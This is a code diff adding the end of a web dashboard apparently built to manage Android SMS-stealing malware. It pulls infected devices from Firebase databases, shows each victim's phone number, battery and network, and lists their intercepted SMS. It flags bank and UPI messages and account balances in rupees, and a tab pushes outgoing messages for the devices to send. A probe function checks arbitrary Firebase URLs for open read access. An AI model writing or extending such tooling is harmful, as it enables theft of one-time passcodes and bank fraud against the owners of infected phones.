+            if (devicesToRender.length === 0) {
+                if (!isFetching) {
+                    grid.innerHTML = '<div class="empty-state">No valid devices found in this database.</div>';
+                }
+                return;
+            }
+
+            devicesToRender.forEach(device => {
+                let battColor = 'var(--accent-green)';
+                if(device.battery <= 20) battColor = 'var(--accent-red)';
+                else if(device.battery <= 50) battColor = 'var(--accent-yellow)';
+
+                const card = document.createElement('div');
+                card.className = 'device-card';
+                card.onclick = () => openPanel(device);
+
+                let balanceHtml = '';
+                if (device.balance > 0) {
+                    balanceHtml = `
+                    <div class="balance-box">
+                        <div>
+                            <div class="bank-name">🏦 ACCOUNT</div>
+                            <div style="font-size:0.65rem; color:var(--text-muted); margin-top:2px;">Last Balance</div>
+                        </div>
+                        <div class="amount">₹${device.balance.toLocaleString('en-IN')}</div>
+                    </div>`;
+                }
+
+                card.innerHTML = `
+                    <div class="card-header">
+                        <div class="device-id" title="${device.id}"><span class="wifi-icon">📶</span> ${formatPhone(device.id)}</div>
+                        <div class="dots-icon">⋮</div>
+                    </div>
+                    <div class="card-row">
+                        <div class="data-col">
+                            <span class="data-label">Android</span>
+                            <span class="data-val">${device.android}</span>
+                        </div>
+                        <div class="data-col" style="align-items: flex-end;">
+                            <span class="data-label">Battery</span>
+                            <div class="battery-indicator">
+                                <div class="batt-bar"><div class="batt-fill" style="width: ${device.battery}%; background: ${battColor}"></div></div>
+                                <span style="color:${battColor}">${device.battery}%</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card-row">
+                        <div class="data-col">
+                            <span class="data-label">Number</span>
+                            <span class="data-val">${formatPhone(device.number)}</span>
+                        </div>
+                        <div class="data-col" style="align-items: flex-end;">
+                            <span class="data-label">Network</span>
+                            <span class="data-val" style="color: ${device.network !== 'Unknown' ? 'var(--text-main)' : 'var(--text-muted)'}">${device.network}</span>
+                        </div>
+                    </div>
+                    ${balanceHtml}
+                    <div class="card-footer">
+                        <div class="dot" style="background: ${device.isOnline ? 'var(--accent-green)' : 'var(--text-muted)'}"></div>
+                        <span class="status-text ${device.isOnline ? 'online' : 'offline'}">${device.isOnline ? 'Online' : 'Offline'}</span>
+                    </div>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        function applyFilters() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            let filtered = allDevices.filter(d => d.number.toLowerCase().includes(query) || d.id.toLowerCase().includes(query));
+            
+            if (currentDbFilter !== 'ALL') {
+                filtered = filtered.filter(d => d.dbSource === currentDbFilter);
+            }
+
+            if (currentFilter === 'Online') filtered = filtered.filter(d => d.isOnline);
+            else if (currentFilter === 'Offline') filtered = filtered.filter(d => !d.isOnline);
+            else if (currentFilter === 'Bank') filtered = filtered.filter(d => d.bankCount > 0);
+            else if (currentFilter === 'Upi') filtered = filtered.filter(d => d.messages.some(m => m.isUpi));
+            else if (currentFilter === 'Card') filtered = filtered.filter(d => d.balance > 0);
+
+            const sortVal = document.getElementById('sortSelect').value;
+            filtered.sort((a, b) => {
+                let timeA = a.messages.length ? Math.max(...a.messages.map(m => m.rawTime)) : 0;
+                let timeB = b.messages.length ? Math.max(...b.messages.map(m => m.rawTime)) : 0;
+                return sortVal === 'newest' ? timeB - timeA : timeA - timeB;
+            });
+
+            renderUI(filtered);
+        }
+
+        function setDbFilter(val) {
+            currentDbFilter = val;
+            document.getElementById('deviceGrid').innerHTML = '<div class="empty-state">⏳ Loading...</div>';
+            allDevices = [];
+            fetchData();
+        }
+
+        function setFilter(type, btn) {
+            currentFilter = type;
+            document.querySelectorAll('.f-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            applyFilters();
+        }
+
+        function openPanel(device) {
+            activeDevice = device;
+            document.getElementById('panel-device-id').innerText = formatPhone(device.id);
+            document.getElementById('panel-device-number').innerText = formatPhone(device.number);
+            document.getElementById('panel-batt').innerText = device.battery + "%";
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('sidePanel').classList.add('active');
+            switchTab('info');
+        }
+
+        function closePanel() {
+            document.getElementById('overlay').classList.remove('active');
+            document.getElementById('sidePanel').classList.remove('active');
+            activeDevice = null;
+        }
+
+        function switchTab(tab) {
+            if (!activeDevice) return;
+            document.querySelectorAll('.p-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+
+            document.getElementById('tab-bank').innerText = `Bank (${activeDevice.bankCount})`;
+            document.getElementById('tab-sms').innerText = `SMS (${activeDevice.messages.length})`;
+
+            const content = document.getElementById('panel-content');
+            content.innerHTML = '';
+
+            if (tab === 'info') {
+                content.innerHTML = `
+                    <div class="info-row"><span class="info-label">Device ID</span><span style="font-weight:600; word-break:break-all;">${formatPhone(activeDevice.id)}</span></div>
+                    <div class="info-row"><span class="info-label">Phone Number</span><span style="font-weight:600">${formatPhone(activeDevice.number)}</span></div>
+                    <div class="info-row"><span class="info-label">Battery Level</span><span style="font-weight:600; color:var(--accent-green)">${activeDevice.battery}%</span></div>
+                    <div class="info-row"><span class="info-label">Network</span><span style="font-weight:600">${activeDevice.network}</span></div>
+                    <div class="info-row"><span class="info-label">Database</span><span style="font-weight:600">${activeDevice.dbSource}</span></div>
+                `;
+            } else if (tab === 'send') {
+                content.innerHTML = `
+                    <div style="display:flex; flex-direction:column; gap:10px;">
+                        <p style="font-size:0.8rem; color:var(--text-muted);">Send message to ${formatPhone(activeDevice.number)} (Requires write access)</p>
+                        <textarea id="smsText" style="background:#18181b; border:1px solid var(--border-color); padding:12px; border-radius:8px; color:white; resize:none; height:100px; font-family:inherit;" placeholder="Type your message here..."></textarea>
+                        <button onclick="sendSMS()" style="background:var(--accent-blue); color:white; border:none; padding:12px; border-radius:8px; cursor:pointer; font-weight:600;">Send Message 🚀</button>
+                        <div id="send-status" style="font-size:0.8rem; margin-top:5px;"></div>
+                    </div>
+                `;
+            } else {
+                let msgsToShow = tab === 'bank' ? activeDevice.messages.filter(m => m.isBank) : activeDevice.messages;
+                msgsToShow.sort((a,b) => (b.rawTime || 0) - (a.rawTime || 0));
+
+                if (msgsToShow.length === 0) {
+                    content.innerHTML = '<div class="empty-state">No messages found.</div>';
+                } else {
+                    content.innerHTML = `<div style="font-size:0.75rem; color:var(--text-muted); margin-bottom:15px; display:flex; justify-content:space-between; padding:0 5px;"><span>Last 60 messages · auto-refreshes</span><span>🔄</span></div>`;
+                    
+                    msgsToShow.forEach(msg => {
+                        const senderClass = msg.isBank ? 'bank-sender' : '';
+                        const itemClass = msg.isBank ? 'bank' : '';
+                        content.innerHTML += `
+                            <div class="sms-item ${itemClass}">
+                                <div class="sms-header">
+                                    <span class="sms-sender ${senderClass}">${msg.sender}</span>
+                                    <span class="sms-time">${msg.time}</span>
+                                </div>
+                                <div class="sms-body">${msg.text}</div>
+                            </div>
+                        `;
+                    });
+                }
+            }
+        }
+
+        async function sendSMS() {
+            const text = document.getElementById('smsText').value;
+            if(!text) return;
+            const statusDiv = document.getElementById('send-status');
+            statusDiv.innerHTML = "⏳ Sending...";
+            const dbUrl = databases[activeDevice.dbSource];
+            try {
+                const res = await fetch(`${dbUrl}/sent_messages.json`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ to: activeDevice.number, message: text, timestamp: Date.now() })
+                });
+                if(res.ok) {
+                    statusDiv.innerHTML = "<span style='color:var(--accent-green)'>✅ Message saved to DB!</span>";
+                    document.getElementById('smsText').value = '';
+                } else throw new Error("Permission denied");
+            } catch (e) {
+                statusDiv.innerHTML = `<span style="color:var(--accent-red)">❌ Failed: Database write permission denied.</span>`;
+            }
+        }
+
+        async function manualRefresh() {
+            await fetchData();
+        }
+
+        function openModal() {
+            document.getElementById('addModal').classList.add('active');
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('modal-status').style.display = 'none';
+            document.getElementById('newFirebaseUrl').value = '';
+        }
+
+        function closeModal() {
+            document.getElementById('addModal').classList.remove('active');
+            document.getElementById('overlay').classList.remove('active');
+        }
+
+        async function addFirebase() {
+            let url = document.getElementById('newFirebaseUrl').value.trim();
+            if(!url) return;
+            if(url.endsWith('/')) url = url.slice(0, -1);
+            if(!url.startsWith('http')) url = 'https://' + url;
+
+            const statusDiv = document.getElementById('modal-status');
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = "⏳ Checking database...";
+            statusDiv.style.color = "var(--accent-yellow)";
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000); 
+                const res = await fetch(`${url}/.json`, { signal: controller.signal });
+                clearTimeout(timeoutId);
+
+                if (!res.ok) {
+                    if (res.status === 400) throw new Error("Database is deactivated.");
+                    if (res.status === 401 || res.status === 403) throw new Error("Database is locked.");
+                    throw new Error(`HTTP Error ${res.status}`);
+                }
+                const data = await res.json();
+                if(!data) throw new Error("Database is empty.");
+
+                let dbName = url.split('//')[1].split('.')[0].replace('-default-rtdb', '');
+                databases[dbName] = url;
+                localStorage.setItem('firex_dbs', JSON.stringify(databases));
+                
+                statusDiv.innerHTML = "✅ Added! Loading data...";
+                statusDiv.style.color = "var(--accent-green)";
+                
+                setTimeout(() => { 
+                    closeModal(); 
+                    initDropdown(); 
+                    currentDbFilter = dbName; 
+                    document.getElementById('dbFilterSelect').value = dbName;
+                    fetchData(); 
+                }, 1000);
+            } catch (e) {
+                statusDiv.innerHTML = `❌ Error: ${e.message || 'Timeout'}`;
+                statusDiv.style.color = "var(--accent-red)";
+            }
+        }
+
+        // Initialize App
+        initDropdown();
+        fetchData();
+    </script>
+</body>
+</html>
